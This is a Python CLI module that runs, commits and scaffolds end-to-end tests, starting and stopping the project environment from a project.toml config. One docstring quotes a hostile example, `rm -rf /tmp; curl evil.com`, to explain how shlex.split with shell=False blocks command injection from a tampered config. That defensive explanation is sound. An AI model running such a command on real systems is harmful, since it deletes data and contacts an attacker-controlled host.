"""Shield commands - e2e 测试编写 (B 级).

Shield 职责: 按 test-plan §6 写 e2e 测试 (Playwright/testclient/DB 直查)。
B 级 agent - 方法固定, 省成本。
lk 提供: 运行 e2e + 按规范 commit + 生成骨架。

e2e env 配置 (fix-001a 后):
- 读 .louke/project/project.toml 的 [e2e] 段 (Archer M-ARCH 填)
- 默认自动按 start → wait ready → 跑 e2e → teardown 顺序执行
- --no-env 跳过自动启停 (用户已手动启动项目)
- 命令执行: shlex.split + shell=False (防 project.toml 篡改注入)
"""
import argparse
import shlex
import subprocess
import sys
import time
from pathlib import Path

from ._common import _toml_load, git, PROJECT_INFO_PATH


def register(subparsers):
    parser = subparsers.add_parser('shield', help='e2e 测试编写 (Shield, B 级)')
    sub = parser.add_subparsers(dest='command', required=True, metavar='<command>')

    p = sub.add_parser('run-e2e', help='运行 e2e 测试 (默认按 project.toml [e2e] 段自动启停)')
    p.add_argument('--spec', default='', help='spec-id (可选, 过滤)')
    p.add_argument('--browser', default='chromium', choices=['chromium', 'firefox', 'webkit'])
    p.add_argument('--no-env', action='store_true', help='跳过自动 start/ready/teardown (用户已手动启动)')

    p = sub.add_parser('commit-e2e', help='提交 e2e 测试 (按规范)')
    p.add_argument('--spec', required=True)
    p.add_argument('--message', required=True)

    p = sub.add_parser('scaffold', help='生成 e2e 测试骨架 (Playwright/testclient/DB 三种模板)')
    p.add_argument('--spec', required=True)
    p.add_argument('--type', required=True, choices=['playwright', 'testclient', 'db'])
    p.add_argument('--scenario', required=True, help='场景名, 例 user_login_flow')
    p.add_argument('--ac-id', required=True, help='AC-FRXXXX-YY 引用')


def run(args):
    handlers = {
        'run-e2e': cmd_run_e2e,
        'commit-e2e': cmd_commit_e2e,
        'scaffold': cmd_scaffold,
    }
    return handlers.get(args.command, lambda _: 1)(args) or 0


def _read_e2e_env_from_config() -> dict:
    """读 project.toml [e2e] 段. 委托 _common._toml_load, 零 regex.

    Schema:
        [e2e]
        start = "make e2e-env-up"           # 可选, 启动项目
        ready = "curl -sf http://localhost/health"  # 可选, 检测就绪 (exit 0)
        ready_timeout_seconds = 60          # 可选, 默认 60
        framework = "playwright"             # 可选, playwright | testclient | db
        browsers = ["chromium"]              # 可选, 仅 playwright 有效
        teardown = "make e2e-env-down"      # 可选, 清理
    """
    data = _toml_load(PROJECT_INFO_PATH)
    if not data:
        return {}
    return data.get('e2e', {}) or {}


def _run_command(cmd_str: str, cwd: Path) -> int:
    """安全执行 shell 命令. shlex.split + shell=False, 防 project.toml 篡改注入.

    即使 project.toml 被恶意修改, 也无法注入 shell 元字符
    (例如 `rm -rf /tmp; curl evil.com` 被 shlex 拆为 ['rm', '-rf', '/tmp;', 'curl', 'evil.com'], 不执行 curl).
    """
    if not cmd_str or not cmd_str.strip():
        return 0
    try:
        args = shlex.split(cmd_str)
    except ValueError as e:
        print(f'[shield] 命令解析失败: {cmd_str!r} ({e})', file=sys.stderr)
        return 1
    if not args:
        return 0
    return subprocess.run(args, cwd=cwd, shell=False, check=False).returncode


def _wait_ready(ready_cmd: str, cwd: Path, timeout_seconds: int) -> bool:
    """轮询 ready 命令直到 exit 0 或超时."""
    deadline = time.time() + timeout_seconds
    while time.time() < deadline:
        if _run_command(ready_cmd, cwd) == 0:
            return True
        time.sleep(2)
    return False


def _default_e2e_config(spec):
    """内置默认 e2e 配置 (playwright pytest). Shield 自管."""
    return {
        'command': 'python3',
        'args': ['-m', 'pytest', '-q', '--tb=short', '--browser={browser}'],
        'path': f'.louke/project/specs/{spec}/tests/e2e/' if spec else 'tests/e2e/',
    }


def cmd_run_e2e(args):
    """运行 e2e 测试. 默认按 project.toml [e2e] 段启停项目; --no-env 跳过."""
    cwd = Path.cwd()
    cfg = _default_e2e_config(args.spec)

    env = {} if args.no_env else _read_e2e_env_from_config()
    start = str(env.get('start', '')).strip()
    ready = str(env.get('ready', '')).strip()
    teardown_cmd = str(env.get('teardown', '')).strip()
    try:
        ready_timeout = int(env.get('ready_timeout_seconds', 60))
    except (TypeError, ValueError):
        ready_timeout = 60

    print(f"=== Run E2E ===")
    print(f"Config source: {'--no-env (manual)' if args.no_env else 'project.toml [e2e] section'}")
    print(f"Browser: {args.browser}")

    # 1. Start
    if start:
        print(f"\n[e2e] start: {start}")
        rc = _run_command(start, cwd)
        if rc != 0:
            print(f'[e2e] start failed (rc={rc})', file=sys.stderr)
            return rc

    # 2. Wait ready (轮询 ready 命令直到 exit 0 或超时)
    if ready:
        print(f"\n[e2e] waiting ready ({ready}, timeout {ready_timeout}s)")
        if not _wait_ready(ready, cwd, ready_timeout):
            print(f'[e2e] timeout waiting ready ({ready_timeout}s)', file=sys.stderr)
            if teardown_cmd:
                print(f'[e2e] teardown (after timeout): {teardown_cmd}')
                _run_command(teardown_cmd, cwd)
            return 1
        print('[e2e] ready')

    # 3. Run e2e
    cmd = [cfg['command'], *cfg['args'], cfg['path']]
    cmd = [c.replace('{browser}', args.browser) for c in cmd]
    print(f"\n[e2e] run: {' '.join(cmd)}")
    rc = subprocess.run(cmd, cwd=cwd, shell=False, check=False).returncode
    print(f"[e2e] exit code: {rc}")

    # 4. Teardown (无论成功失败)
    if teardown_cmd:
        print(f"\n[e2e] teardown: {teardown_cmd}")
        _run_command(teardown_cmd, cwd)

    return rc


def cmd_commit_e2e(args):
    """Commit e2e tests with proper format."""
    cwd = Path.cwd()
    spec_path = f".louke/project/specs/{args.spec}/tests/e2e/"

    print(f"=== Commit E2E ===")
    print(f"Spec path: {spec_path}")
    print(f"Message: {args.message}")

    cmds = [
        ['git', 'add', spec_path],
        ['git', 'commit', '-m', f'e2e: {args.message}'],
        ['git', 'push'],
    ]
    for cmd in cmds:
        rc, out, err = git(*cmd[1:], cwd=cwd)
        if rc != 0:
            print(f"failed: {' '.join(cmd)}\n{err}", file=sys.stderr)
            return rc
    print("✓ E2E committed and pushed")
    return 0


def cmd_scaffold(args):
    """生成 e2e 测试骨架模板.

    路径与 cmd_commit_e2e 对齐: .louke/project/specs/{spec}/tests/e2e/
    (e2e 测试属于 spec 范围, 不放顶层 tests/, 避免跨 spec 互相干扰)
    """
    cwd = Path.cwd()
    spec_path = f".louke/project/specs/{args.spec}/tests/e2e"
    target_dir = cwd / spec_path
    target_dir.mkdir(parents=True, exist_ok=True)
    target_file = target_dir / f'test_{args.scenario}.py'

    templates = {
        'playwright': f'''"""E2E test: {args.scenario} (AC: {args.ac_id}).

Generated by lk shield scaffold. Test framework: Playwright.
"""
import pytest
from playwright.sync_api import Page


@pytest.mark.e2e
def test_{args.scenario}(page: Page):
    """{args.ac_id}: {args.scenario}."""
    # 1. 准备 (启动服务/构造数据)
    # ...

    # 2. 执行 (浏览器操作)
    # page.goto("/...")
    # page.fill(...)
    # page.click(...)

    # 3. 断言 (按 interfaces.md 出口断言)
    # assert page.url.endswith("/...")
    # assert page.locator("...").text_content() == "..."
''',
        'testclient': f'''"""E2E test: {args.scenario} (AC: {args.ac_id}).

Generated by lk shield scaffold. Test framework: TestClient (HTTP).
"""
import pytest
from fastapi.testclient import TestClient


@pytest.mark.e2e
def test_{args.scenario}(client: TestClient):
    """{args.ac_id}: {args.scenario}."""
    # 1. 准备
    # ...

    # 2. 执行 (API 调用)
    # response = client.get("/...")
    # response = client.post("/...", json={{...}})

    # 3. 断言 (按 interfaces.md 出口断言)
    # assert response.status_code == 200
    # assert "..." in response.json()
''',
        'db': f'''"""E2E test: {args.scenario} (AC: {args.ac_id}).

Generated by lk shield scaffold. Test framework: 直查 DB.
"""
import pytest


@pytest.mark.e2e
def test_{args.scenario}():
    """{args.ac_id}: {args.scenario}."""
    # 1. 准备 (DB 连接)
    # conn = get_db_connection()

    # 2. 执行 (查询/操作)
    # row = conn.execute("...").fetchone()

    # 3. 断言 (按 interfaces.md 出口断言)
    # assert row["state"] == "..."
''',
    }

    template = templates[args.type]
    target_file.write_text(template)
    print(f"✓ Scaffold created: {target_file}")
    return 0